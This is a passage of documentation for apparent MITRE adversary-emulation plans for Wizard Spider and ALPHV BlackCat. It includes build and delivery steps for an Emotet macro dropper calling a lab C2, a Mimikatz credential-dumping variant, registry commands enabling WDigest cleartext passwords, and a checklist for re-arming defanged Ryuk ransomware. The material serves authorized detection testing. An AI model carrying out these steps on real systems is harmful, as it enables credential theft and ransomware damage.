is, then disconnect the share."]}],[{"l":"Emotet Dropper"},{"l":"Overview","p":["This folder contains files used to generate an emotet dropper.","The dropper works as follows:","Word document invokes VBA code via AutoOpen","AutoOpen macro downloads \"adb.vbs\" to %AppData% over 192.168.0.4:8080 / HTTP.","AutoOpen macro executes adb.vbs with cscript.","adb.vbs downloads a second-stage dropper; the dropper is heavily obfuscated.","The second stage VBS code executes base64 encoded PowerShell code.","The PowerShell code downloads EmotetClientDLL.dll over 192.168.0.4:443 / HTTPS and writes to disk at %AppData%\\adb.dll","The PowerShell code executes adb.dll via rundll32.exe and Control_RunDLL function"]},{"l":"Quick Start","p":["Upload ChristmasCard.docx to your intended target.","Open ChristmasCard.docx- it should download/execute the Emotet DLL, and send C2 connections to 192.168.0.4:80 / HTTP."]},{"l":"Usage","p":["Run this script on Windows to generate an obfuscated VBS payload:","Copy obfuscated_emotet_dropper.vbs to the control server at this path:","Now create a new word document","In the word document, go to View> Macros> Record Macro> create a new Macro named AutoOpen and store it the document\"","Hit OK and stop the recording under Macros","Go to View> View Macros> Select and edit AutoOpen macro","Paste the source code from vba_macro_code.vbs into the macro","Upload the word document to the intended target.","The payload should fire automatically after opening the document."]},{"l":"Dependencies","p":["Install Python3, pip, and PyYaml on your Windows system","Make sure your attack platform has cloned the Wizard Spider repo and has the control_server folder."]}],[{"l":"Mimikatz","p":["A variant of Mimikatz that executes lsadump::sam, sekurlsa::logonpasswords, and vault::list without user interaction."]},{"l":"Build Instructions","p":["Open the command prompt (cmd.exe), navigate to directory containing the Mimikatz Visual Studio solution file (mimikatz.sln), and run the devenv.exe command:","cd wizard_spider\\Resources\\Mimikatz\"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Common7\\IDE\\devenv.exe\" mimikatz.sln /build Release","The executable will be found in the x64 folder."]},{"l":"Test Instructions","p":["Open PowerShell","cd wizard_spider\\Resources\\Mimikatz\\mimikatz mimikatz_test.ps1"]},{"l":"Usage Examples"},{"i":"execute-all-lsadumpsam-sekurlsalogonpasswords-and-vaultlist","l":"execute all (lsadump::sam, sekurlsa::logonpasswords, and vault::list)","p":["mimikatz.exe"]},{"i":"execute-lsadumpsam","l":"execute lsadump::sam","p":["mimikatz.exe s"]},{"i":"execute-sekurlsalogonpasswords","l":"execute sekurlsa::logonpasswords","p":["mimikatz.exe l"]},{"i":"execute-vaultlist","l":"execute vault::list","p":["mimikatz.exe v"]},{"l":"Cleanup Instructions","p":["Open a command prompt or PowerShell","del mimikatz.exe"]},{"l":"Misc","p":["To force credentials to be stored in cleartext in memory, Wizard Spider enables WDigest by modifying the registry (must be done as admin):","reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 or(PowerShell) Set-ItemProperty -Path \"HKLM:SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\" -Name UseLogonCredential -Value 1","For the changes to take effect, you must log out and log back in or restart the host.","Verify the change with:","reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest or(PowerShell) Get-ItemProperty -Path \"HKLM:SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\"","Challenges:","Need credentials to log back in, or voice track that the victim logs back in."]},{"l":"CTI Evidence","p":["https://attack.mitre.org/groups/G0102/ https://www.hhs.gov/sites/default/files/trickbot.pdf https://us-cert.cisa.gov/ncas/alerts/aa20-302a https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html"]},{"l":"References","p":["https://github.com/gentilkiwi/mimikatz https://docs.microsoft.com/en-us/visualstudio/ide/reference/build-devenv-exe?view=vs-2019"]},{"i":"cti-evidence-1","l":"CTI Evidence","p":["https://attack.mitre.org/groups/G0102/ https://www.hhs.gov/sites/default/files/trickbot.pdf https://us-cert.cisa.gov/ncas/alerts/aa20-302a https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html"]},{"i":"references-1","l":"References","p":["https://github.com/gentilkiwi/mimikatz https://docs.microsoft.com/en-us/visualstudio/ide/reference/build-devenv-exe?view=vs-2019"]}],[{"l":"Ryuk","p":["A ransomware designed to target enterprise environments."]},{"l":"Overview","p":["The Ryuk ransomware in this scenario has the last step of causing impact on the enterprise network. Among its goals it will stop services, delete backups, mount any discoverable shares and ultimately encrypt the files of the infected machine."]},{"l":"Pre Requirements","p":["In order to accurately execute this this project you will need to generate an RSA 2048 keypair. Use the following commands as an example with openssl to create them:","You will also need to create an AES256 key or use the WinAPI to generate it programmatically with CryptGenKey. Use the following command as an example with openssl to create it:","Keep the keys in a secure location, otherwise recovering any files after the project runs will not be possible."]},{"l":"Remarks","p":["This project in particular has been defanged in preparation for public release. The encryption logic has been removed and needs to be implemented to provide the impact capability. Below is a source code changes checklist that needs to be satisfied before continuing with compilation and use of this resource:","ryuk/file_encryption.cc needs the EncryptionProcedure function to be implement","ryuk/mount_share_operations.cc MountShare function needs szUserName and szPassword initialized with compromised credentials","ryuk/mount_share_operations.cc LoopAndAttemptDriveMountOnAddresses may need the IP address updated depending on your range deployment","(Optional) if you wish to expand the scope of the encryption procedures or share discovery behavior you can look into the bEvalsMode variable and toggle its value (TRUE by default). You may also want to revise which drives you want to encrypt in case the letters don't match up."]},{"l":"Usage","p":["After understanding the remarks and pre-requirements and making the appropiate changes to the source code use following command to compile the binaries for this project:","If successful, it will generate two binaries: ryuk.exe is the main ransomware (careful do not run it accidentally on your host), RyukTests.exe contains the test suite for the project.","The ryuk.exe requires admin privileges on the machine to properly modify its SE_TOKENS, perform the injection, and encrypt the contents of the host."]},{"l":"Ryuk Executable Options"},{"l":"Output sample and File example","p":["The image below shows the encrypted file details. Right at the end of the encrypted file the string \"RYUKTM\" (12 bytes) is present and followed by the encrypted AES256 key (268 bytes)","HEX editor showing an encrypted file","This image shows the project running, and the typical output you might expect","CMD showing tool execution"]},{"l":"Testing","p":["To build and run tests for this binary execute the same command used for compiling the main binary found on the Usage Section of this page. If this step has already been executed, you should see two binaries in the Release folder. The one named \"RyukTests.exe\" corresponds to the test suite."]},{"l":"Fixes","p":["The version of the ryuk source code found on this project has a patch applied to avoid a race condition bug where the main process would start cleaning up memory before waiting for the encryption threads to finish. This would leave some files or drives not encrypted, and would likely cause the injected process to crash as well. The exact details of the changes are under the diff ryuk/synchronization_changes.patch."]},{"l":"References","p":["https://attack.mitre.org/software/S0446/","https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/","https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf","https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/","https://thedfirreport.com/2020/10/08/ryuks-return/","https://n1ght-w0lf.github.io/malware%20analysis/ryuk-ransomware/"]}],[{"l":"Troubleshooting"},{"i":"i-cant-rdp-into-domain-hosts","l":"I can't RDP into domain hosts","p":["DNS is most likely screwed up - we need to fix it.","RDP into the host as local admin, for example:","or for sandworm:","Hit the Windows key, type \"Ethernet settings\", click the app.","Click \"Change Adapter Options\"","Select Ethernet 3","Right-click Ethernet 3, select \"Properties\", then \"Internet Protocol Version 4\" then \"Properties\".","Select \"Use the following DNS server addresses\"","Type your domain controller IP address in the first field.","For Wizard Spider, that is 10.0.0.4.","Select okay; you'll likely be disconnected.","Ask Eric / infrastructure for a reboot through Azure, otherwise reboot manually.","Give it a few minutes and then try to login as intended."]},{"l":"Logging into Kali dev boxes from a Windows Computer","p":["Open the Remote Desktop Connection application.","Note: Click the Show Options if this is your first time and continue with the steps below, if you had a saved RDP profile skip to step 4.","Type the IP of the Kali Computer. For example, 192.168.0.4","Type the User name you were given with the domain you are joining. For example, dungeon\\myuser","Note: At this point you can make other settings changes like reducing the display resolution, color depth to reduce bandwidth, or change local resources.","Check the box Allow me to save credentials(important!) and click Save or Save As...","Click connect and a windows login prompt will appear, type your password and you should be in!","Note: Once you login succesfully you will also have the ability to check \"Always ask for credentials\"."]}],[{"i":"#","p":["Based on open-source intelligence, the ATT&CK Â® Evaluations team created the below scenario leveraging techniques seen from Wizard Spider in the wild. We have adapted the scenario based on tools and resources available at the time. Below is a diagram, scenario overview, step-by-step breakdown, and an infrastructure diagram.","Software Flow Diagram"]},{"l":"Emulation Scenario","p":["\uD83D\uDCD6 This scenario follows Wizard Spider's multi-phase approach to conducting ransomware operations. Wizard Spider uses the initial access provided through Emotet to deploy their TrickBot malware to gain access to the Domain Controllers. Once access is obtained to the Domain controllers, the Ryuk ransomware is deployed. Characteristics of this campaign include an accelerated timeline, sloppy code, and focus for obtaining control over the Domain Controllers as fast as possible in order to deploy Ryuk.","Phase 1 Wizard Spider uses a phishing campaign to send a malicious document with embedded macros document that the initial access victim, Dorothy, downloads and enables. The macros download and execute Emotet, deploys multiple download links to ensure delivery, and establishes C2 over port 8080. Emotet gains persistence by modifying a registry key and downloads an Outlook scraper to collect Outlook contacts message threads and credentials. Emotet laterally moves via RDP using the credentials, and downloads Trickbot.","Phase 2 TrickBot communicates back to the C2 server over HTTP, and Wizard Spider performs extensive network and system discovery. Wizard Spider conducts privilege escalation with kerberosting using Rubeus. Domain controller access is obtained by RDPâing using harvested credentials, and ensuring persistence with a registry key that executes TrickBot with user sign-in. Wizard Spider uses AdFind to map active directory for network reconnaissance.","Phase 3 Using RDP connections to the compromised Domain Controller and wbadmin msc console, Wizard Spider uses a batch script to stop and kill all backup services and processes. Once completed, Ryuk is executed throughout the environment, starting with the backup servers. Ryuk executes automated privilege elevation and defense evasion, and encrypts files recursively."]},{"l":"Scenario Steps","p":["\uD83D\uDC63 Steps start at 01 to follow emulation procedures","Dorothy inadvertently activates a weaponized Emotet Microsoft Office document masquerading as a benign Word document attached to a phishing email. After enabling the macros in Word, the VBscript embedded in the document generates a PowerShell script using the Document_Open() event. The PowerShell script downloads the initial DLL binary as a loader invoked with base64 encoded data, and multiple download links are used to ensure that the initial loader is delivered. The malicious DLL establishes a C2 session with the adversary control server over port 8080. Analyst Note: the document is pre-positioned in the environment. We do not emulate sending the document to target, as our focus is evaluating their product against post-initial-access TTPs.","Emotet","Emotet takes steps to gain persistence in the victim environment by modifying a registry key using the RegSetValueExA WinAPI function.","Employing vssadmin, the adversary copies the active directory database as a volume shadow copy, ntds.dit, and exfiltrates the shadow copy using an RDP-mounted network share.","Enumerating local processes, Emotet also uses WinAPI functions and downloads an Outlook scraper DLL from C2. Executing the Outlook scraper in process memory, PowerShell is used to collect emails and contacts from the client, including credentials from another user, bill@oz.local.","https://attack.mitre.org/groups/G0102/ https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/","https://documents.trendmicro.com/assets/white_papers/ExploringEmotetsActivities_Final.pdf https://www.symantec.com/blogs/threat-intelligence/evolution-emotet-trojan-distributor https://www.picussecurity.com/blog/the-christmas-card-you-never-wanted-a-new-wave-of-emotet-is-back-to-wreak-havoc.html https://www.carbonblack.com/2019/04/24/cb-tau-threat-intelligence-notification-emotet-utilizing-wmi-to-launch-powershell-encoded-code/ https://blog.talosintelligence.com/2019/01/return-of-emotet.html","https://unit42.paloaltonetworks.com/emotet-command-and-control/ https://global.ahnlab.com/global/upload/download/asecreport/ASEC%20REPORT_vol.88_ENG.pdf https://www.cisecurity.org/white-papers/ms-isac-security-primer-emotet/ https://securityintelligence.com/new-banking-trojan-icedid-discovered-by-ibm-x-force-research/","https://us-cert.cisa.gov/ncas/alerts/aa20-302a https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html https://thedfirreport.com/2020/10/08/ryuks-return/ https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/","https://us-cert.cisa.gov/ncas/alerts/aa21-076a#:~:text=TrickBot%20uses%20HTTPS%20to%20communicate,logic%20and%20various%20configuration%20files.text=TrickBot%20downloads%20several%20additional%20files%20and%20saves%20them%20to%20the%20victim https://us-cert.cisa.gov/ncas/alerts/aa20-302a https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/ https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/ https://www.fireeye.com/blog/threat-research/2019/01/a-nasty-trick-from-credential-theft-malware-to-business-disruption.html https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/","https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ https://www.fireeye.com/blog/threat-research/2019/01/a-nasty-trick-from-credential-theft-malware-to-business-disruption.html","https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/ https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/ https://n1ght-w0lf.github.io/malware%20analysis/ryuk-ransomware/","https://www.cynet.com/attack-techniques-hands-on/emotet-vs-trump-deep-dive-analysis-of-a-killer-info-stealer/ https://www.symantec.com/blogs/threat-intelligence/evolution-emotet-trojan-distributor https://www.us-cert.gov/ncas/alerts/TA18-201A https://www.picussecurity.com/blog/the-christmas-card-you-never-wanted-a-new-wave-of-emotet-is-back-to-wreak-havoc.html","https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html","https://www.securityartwork.es/wp-content/uploads/2017/07/Trickbot-report-S2-Grupo.pdf https://eclypsium.com/wp-content/uploads/2020/12/TrickBot-Now-Offers-TrickBoot-Persist-Brick-Profit.pdf https://www.fidelissecurity.com/threatgeek/2016/10/trickbot-we-missed-you-dyre https://blog.trendmicro.com/trendlabs-security-intelligence/trickbot-shows-off-new-trick-password-grabber-module/ https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware","Leveraging Billâs credentials located during the email scraping, Emotet RDPs into the Toto host. Wizard Spider then downloads and executes TrickBot to the Toto host using an RDP-mounted network share. The TrickBot agent communicates back to the C2 server over HTTP.","Phase 1 : Step 1 (T1204.002)(T1059.005)â(T1105)â(T1059.003)â(T1027â)(T1047)â(T1105)â(T1218.011)â(T1071.001)â(T1573.001)â","Phase 1 : Step 3(T1082)â(T1057)â(T1105)(T1552)(T1114.001)","Phase 1: Step 2(T1547.001)â","Phase 2: Step 4(T1021.001)(T1078.002)(T1105)(T1071.001)(T1571)","Phase 2: Step 5(T1082)â(T1007)(T1087.001)(T1087.002)(T1016)(T1049)(T1082)(T1482)(T1069)","Phase 2: Step 6(T1105)â(T1558.003)â","Phase 2: Step 7(T1021.001)â(T1078.002)â(T1105)â(T1547.004)â(T1069.002)","Phase 2: Step 8(T1003.003)â(T1003.002)â","Phase 3: Step 10(T1105)â(T1134)â(T1057)â(T1055.002)â(T1082)â(T1083)â(T1486)â","Phase 3: Step 9(T1105)â(T1489)â(T1222.001)â(T1105)â(T1490)â","Reporting","Rubeus","Ryuk","Software","Steps","The adversary leverages TrickBot for extensive system and network discovery, collecting relevant information from the victim machine.","TrickBot","TrickBot AdFind","User Story","Using the previously established RDP-network mounted shared, Ryuk is uploaded to the domain controller and executed from CMD. Ryuk escalates privileges, injects into notepad.exe process space and encrypts files on its current host recursively, using a combination of AES and RSA encryption. Analyst Note: early versions of our Ryuk emulation encrypted the entire filesystem; however, this proces took hours, rather than minutes, so we scaled it back due to time constraints.","Using the vfleming user, the adversary RDPâs into the domain controller and downloads a variant of TrickBot using the PowerShell Invoke-WebRequest command. To ensure persistence, Wizard Spider installs a registry key to execute Trickbot when vflemming logs in. Leveraging the AdFind utility for reconnaissance, the adversary enumerates the domain, mapping the network.","Wizard Spider escalates privileges with kerberoasting, using the public Kerberos abuse tool, Rubeus. They next collect encrypted credentials for the domain admin, vFleming, and decrypt the users credentials offline. Analyst Note: offline cracking isn't performed due to time constraints; its also not in scope for the evaluation, so we skip the behavior.","Wizard Spider prepares the environment to deploy Ryuk ransomware, mounting the C$ share of the Toto Host. The adversary uploads two files that stop specific services for system residency and deletes backups and shadow copies to inhibit system recovery."]},{"l":"Infrastructure Diagram"}],[{"l":"Intelligence Summary"},{"i":"adversary-overview","l":"Adversary Overview \uD83E\uDE84 \uD83D\uDD78ï¸","p":["Wizard Spider is a Russia-based e-crime group originally known for the Trickbot banking malware. 1 In August 2018, Wizard Spider added capabilities to their Trickbot software enabling the deployment of the Ryuk ransomware. 2 3 This resulted in \"big game hunting\" campaigns, focused on targeting large organizations for high-ransom return rates. 4 Notable Ryuk attacks include the Universal Healthcare System Hospitals, US Georgia and Florida state government administrative offices, and Chinese companies. 5 6","According to the FBI, in less than one year (2019-2020) Wizard Spider extorted $61 million USD from ransomware attacks. 7 8 Throughout the operations, the group used a multi-staged approach to manage ransomware campaigns. 9 Prior to encrypting a victim's network, the group exfiltrates sensitive data and threatens to publicly disclose it if the victim refuses to pay the ransom.","Associated Names: UNC1878, TEMP.MixMaster, Grim Spider, Team9"]},{"i":"group-overview-report-references","l":"Group Overview Report References \uD83D\uDD17","p":["1","2","3","4","5","6","7","8","9","https://attack.mitre.org/groups/G0102/","https://intel471.com/blog/ransomware-as-a-service-2020-ryuk-maze-revil-egregor-doppelpaymer/","https://www.bleepingcomputer.com/news/security/uhs-hospitals-hit-by-reported-country-wide-ryuk-ransomware-attack/campaign/#:~:text=SandWorm%20is%20an%20APT%20group,aggressive%20and%20sometimes%20destructive%20cyberattacks.","https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/","https://www.cybersecuritydive.com/news/Ryuk-FBI-DHS-ransomware-healthcare/587961/","https://www.trendmicro.com/en_us/research/19/b/trickbot-adds-remote-application-credential-grabbing-capabilities-to-its-repertoire.html","https://www.upi.com/Top_News/US/2019/07/08/Ransom-hackers-hit-Georgia-courts-after-cities-pay-1M/4111562116580/","https://www.youtube.com/watch?v=LUxOcpIRxmg","ID","JISC Report","Report Links"]},{"i":"connect-with-us","l":"Connect with us \uD83D\uDDE8ï¸","p":["We \uD83D\uDC96 feedback! Let us know how using ATT&CK Evaluation results has helped you and what we can do better.","Email: evals@mitre-engenuity.org Twitter: https://twitter.com/MITREengenuity LinkedIn: https://www.linkedin.com/company/mitre-engenuity/"]}],[{"l":"ALPHV BlackCat","p":["License","Based on open-source intelligence, the MITRE ATT&CKÂ® Evaluations team created the ALPHV BlackCat scenario leveraging techniques seen in affiliate operations in the wild. The scenario was designed based on tools, resources, and intelligence available at the time."]},{"i":"adversary-overview","l":"Adversary Overview \uD83D\uDC08ââ¬","p":["ALPHV BlackCat, also known as Noberus, was a prolific Russian-speaking, ransomware-as-a-service (RaaS) group that emerged in 2021 and was linked to BlackMatter, DarkSide, REvil, and other RaaS groups 1. ALPHV BlackCat utilized ransomware coded in Rust, allowing for enhanced performance, flexibility, and cross-platform capabilities. During it's tenure, ALPHV BlackCat consistently upgraded its tooling and tradecraft, with the last variant, Sphynx, rewritten with enhanced defense evasion capabilities, according to the group 2, 3. The group is alleged to have targeted over a thousand victims across the globe 4. In December 2023, The United States (U.S.) Department of Justice announced they had disrupted group operations and developed an decryption tool for victims 5. The group announced it was removing restrictions previously placed on affiliates, and the most recent targets included MGM Resorts and Change Healthcare in March 2024. Following the Change Healthcare incident, the Department of State issued a reward offer for information on the group due to its targeting of U.S. Critical Infrastructure."]},{"l":"Quick Links"},{"l":"Resources","p":["The Resources Folder contains the emulated software source code.","All other pre-built executables have been removed. To rebuild the binaries, follow the documentation for the respective binary."]},{"i":"emulation-key-software","l":"Emulation Key Software \uD83D\uDCBB","p":["BlackCat ransomware","ExMatter","InfoStealer"]},{"l":"Scenario Walkthrough","p":["ALPHV BlackCat Scenario Overview- Overview of the ALPHV BlackCat scenario","ALPHV BlackCat Emulation Plan- Step by step walkthrough of the ALPHV BlackCat red team emulation plan (6 steps)"]},{"l":"Acknowledgements","p":["We would like to formally thank the people that contributed to the content, review, and format of this document. This includes the MITRE ATT&CK and MITRE ATT&CK Evaluations teams, the organizations and people that provided public intelligence and resources, as well as the following organizations that participated in the community cyber threat intelligence contribution process:","Microsoft","CrowdStrike"]},{"i":"connect-with-us","l":"Connect with us \uD83D\uDDE8ï¸","p":["We \uD83D\uDC96 feedback! Let us know how using ATT&CK Evaluation results has helped you and what we can do better.","Email: evals@mitre-engenuity.org Twitter: https://twitter.com/MITREengenuity LinkedIn: https://www.linkedin.com/company/mitre-engenuity/"]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["Â© 2024 MITRE Engenuity. Approved for Public Release. Document number CT0005.","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CKÂ®","ATT&CK Terms of Use"]}],[{"i":"alphv-blackcat","l":"ALPHV BlackCat \uD83D\uDC08ââ¬"},{"l":"Adversary Overview","p":["ALPHV BlackCat, also known as Noberus, was a prolific Russian-speaking, ransomware-as-a-service (RaaS) group that emerged in 2021 and was linked to BlackMatter, DarkSide, REvil, and other RaaS groups 1. ALPHV BlackCat utilized ransomware coded in Rust, allowing for enhanced performance, flexibility, and cross-platform capabilities. During it's tenure, ALPHV BlackCat consistently upgraded its tooling and tradecraft, with the last variant, Sphynx, rewritten with enhanced defense evasion capabilities, according to the group 2, 3. The group is alleged to have targeted over a thousand victims across the globe 4. In December 2023, The United States (U.S.) Department of Justice announced they had disrupted group operations and developed an decryption tool for victims 5. The group announced it was removing restrictions previously placed on affiliates, and the most recent targets included MGM Resorts and Change Healthcare in March 2024. Following the Change Healthcare incident, the Department of State issued a reward offer for information on the group due to its targeting of U.S. Critical Infrastructure."]},{"l":"Key Adversary Report References","p":["1","2","3","4","5","6","7","8","9","Analyzing Exmatter: A Ransomware Data Exfiltration Tool","BlackCat Ransomware (ALPHV)","BlackCat ransomware attacks not merely a byproduct of bad luck","Fat Cats","From BlackMatter to BlackCat: Analyzing two attacks from one affiliate","Noberus: Technical Analysis Shows Sophistication of New Rust-based Ransomware","Ransomware Spotlight: BlackCat","Report Links","Source ID","The many lives of BlackCat ransomware","Threat Assessment: BlackCat Ransomware"]}],[{"l":"Scenario Diagrams","p":["This scenario involved an ALPHV BlackCat affiliate orchestrating an attack against the subsidiary of a fictitious global pharmaceutical company. Below are diagrams depicting the affiliate's attack sequence and the major activities executed. An Operations Flow, Software Flow, Infrastructure Diagram and Technique Scope. For the detailed emulation plan, refer to the ( ALPHV BlackCat Emulation Plan)."]},{"l":"Operations Flow"},{"l":"Software Flow"},{"l":"Infrastructure Diagram"},{"l":"Technique Scope","p":["Diagram Scope"]}],[{"l":"Scenario Overview","p":["This scenario involved an ALPHV BlackCat affiliate orchestrating an attack against the subsidiary of a fictitious global pharmaceutical company. Included below is a diagram outlining the attack sequence and major activities executed. For the detailed emulation plan, refer to the ( ALPHV BlackCat Emulation Plan)."]},{"l":"Overview","p":["An Initial Access Broker gains access to a contractor organization, and provides an ALPHV BlackCat affiliate with RDP access to the organizationâs network. The discovery of kimeramon, a bastion workstation, makes way for the affiliate to access the corporate subsidiary network through trusted access ( Step 1-2 of Bastion Host Diagram). Next the affiliate downloads ADRecon.ps1, and uses it for discovery on Active Directory and the corporate network. The ADRecon output contains information about a backup server datamon, Linux KVM server leomon and server administrators ( Step 3 of Bastion Host Diagram).","Next, the affiliate discovers SQL Server Management Studio installed on kimeramon and uses BITSAdmin.exe to download InfoStealer then executes InfoStealer against kimeramon to obtain plaintext credentials for the backup admin account ( Step 4 of Bastion Host Diagram). The compromised credentials are used to access the backup server and execute InfoStealer against the NetBNMBackup server datamon( Step 3 of SQL Server Diagram). The decrypted output contains the plaintext passwords for: the workstation local administrator account windesk, Linux KVM server administrator account marakawa, and the domain admin account ykaida.da. Using windesk, the affiliate utilizes several methods in an attempt to disable anti-virus and EDR solutions on the bastion host.","The affiliate utilizes windesk credentials and the RDP session on kimeramon to edit the registry and enable WDigest. The affiliate then dumps credentials via Task Manager and exfiltrates the dump file using rclone( Step 5 of Bastion Host Diagram).","The compromised domain admin account ykaida.da is used to download ExMatter and a network scanning script to identify additional targets via PowerShell ( Step 6-7 of Bastion Host Diagram). The affiliate uses PsExec to execute ExMatter against the identified targets to exfiltrate data. After remote execution of ExMatter, the affiliate executes ExMatter on the local workstation.","The affiliate downloads ALPHV BlackCat Ransomware (Linux) to kimeramon, uses SCP to copy ALPHV BlackCat Ransomware (Linux) to leomon and sends an SSH command to the Linux KVM server to execute ( Step 1-4 of Linux KVM Diagram).","Next, the affiliate downloads ALPHV BlackCat Ransomware (Windows) to kimeramon( Step 8 of Bastion Host Diagram) and provides the Domain Admin credentials to run the executable with administrative privileges. After encryption, ALPHV BlackCat Ransomware changes wallpaper for logged-in users to an image of the ransom note, unmounts previously mounted partitions, deletes volume shadow copies again, and lists and clears Windows Event logs via API calls."]}],[{"l":"ALPHV BlackCat Emulation Plans","p":["This directory contains the emulation plans for a BlackCat affiliate.","â¹ï¸ An emulation plan is the primary document used to execute the red team scenario during a purple team operation.","The scenario documents in the table below include the red team execution commands, links to source code, ATT&CK techniques leveraged, and CTI reporting pertaining to each scenario step.","Red Team Playbook","CTI Overview","Description","ALPHV BlackCat_Scenario.md","ALPHV BlackCat CTI Overview","This contains the scenario developed to emulate TTPs of a BlackCat affiliate in Round 2 of ATT&CK Evaluations for Managed Services"]}],[{"l":"ALPHV BlackCat Scenario Overview"},{"i":"step-0---operator-setup","l":"Step 0 - Operator Setup"},{"i":"procedures","l":"â£ï¸ Procedures","p":["Initiate an RDP session to the Kali attack host kraken (176.59.1.18)","Open a terminal window and start the webdav server:","Ensure the evalsC2server simple file server handler was started. If it hasn't been started in another terminal window, start the evalsC2server, ensuring the following handlers are enabled:","Simple file server"]},{"i":"step-1---initial-compromise-and-discovery","l":"Step 1 - Initial Compromise and Discovery"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["An Access Broker gains access to a contractor organization which provides the BlackCat affiliate with RDP access to a bastion host kimeramon (10.20.20.11) within the corporate subsidiary network used by the contractor. The BlackCat affiliate utilizes the trusted access between the compromised contractor organization to RDP to the bastion host kimeramon (10.20.20.11) within the corporate subsidiary network and download ADRecon.ps1.","The BlackCat affiliate uses ADRecon.ps1 to discover information about the Active Directory and corporate network. After analyzing the output of ADRecon, the BlackCat affiliate learns the following:","NetBNMBackup server datamon (10.20.10.122)","Linux KVM server leomon (10.20.10.16)","Server administrators"]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Initiate an RDP session to the contractor workstation raremon (10.30.10.4)","From the contractor workstation raremon (10.30.10.4), RDP to the bastion host kimeramon (10.20.20.11) using the contractor's credentials:","Username","Password","DIGIREVENGE\\zorimoto","tzTVgs44isT4YxWU!","Within the RDP session to the bastion host kimeramon (10.20.20.11), open Edge and browse to:","Click the download button to \"Download raw file\" to the Downloads folder","Open a non-elevated PowerShell and execute ADRecon.ps1:","Using File Explorer, browse to the ADRecon output directory to confirm ADRecon executed successfully","Right click the Computers.csv, hover over Open with and click LibreOffice, then OK","Repeat the above for GroupMembers.csv"]},{"i":"reference-code-reporting","l":"\uD83D\uDD0D Reference Code & Reporting","p":["-","ATT&CK Technique","Download of ADRecon.ps1","Execute ADRecon Get-ADRComputer","Execute ADRecon Get-ADRGroupMember","HC3 Microsoft Cisco Mandiant","https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/","https://github.com/sense-of-security/ADRecon/blob/master/ADRecon.ps1","https://github.com/sense-of-security/ADRecon/blob/master/ADRecon.ps1#L7628","https://github.com/sense-of-security/ADRecon/blob/master/ADRecon.ps1#L8948","https://www.blackberry.com/us/en/solutions/endpoint-security/ransomware-protection/blackcat#prevent","https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf","https://www.mandiant.com/resources/blog/alphv-ransomware-backup","https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/","â¹ï¸ NOTE: Not all techniques listed in this table directly map to evaluation substeps","Microsoft","Open PowerShell","RDP to bastion host","Red Team Activity","Relevant CTI Report","Source Code Link","T1018 Remote System Discovery","T1021.001 Remote Services: Remote Desktop Protocol","T1059.001 Command and Scripting Interpreter: PowerShell","T1069.002 Permission Groups Discovery: Domain Groups","T1078.002 Valid Accounts: Domain Accounts","T1105 Ingress Tool Transfer"]},{"i":"step-2---credential-access","l":"Step 2 - Credential Access"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["The BlackCat affiliate notices SQL Server Management Studio is installed on the bastion host and, on opening of the application, confirms the existence of a local database modeled after the NetBNMBackup database. Using BITSAdmin.exe, the BlackCat affiliate downloads InfoStealer using BITS and executes InfoStealer against the bastion host. The output contains plaintext credentials for the SQL admin account netbnmadmin.","Using the zorimoto credentials to authenticate, the BlackCat affiliate then then RDPs to datamon (10.20.10.122) to execute InfoStealer against the NetBNMBackup server.","The decrypted output contains the plaintext passwords for:","The workstation local administrator account windesk","Linux KVM server administrator account marakawa","Domain admin account ykaida.da","Using the workstation local administrator account windesk, the BlackCat affiliate uses several methods to attempt to disable anti-virus and EDR solutions on the bastion host:","Terminate processes and stop anti-virus services via Task Manager","Open Windows Security and disable Real-time protection in \"Virus & 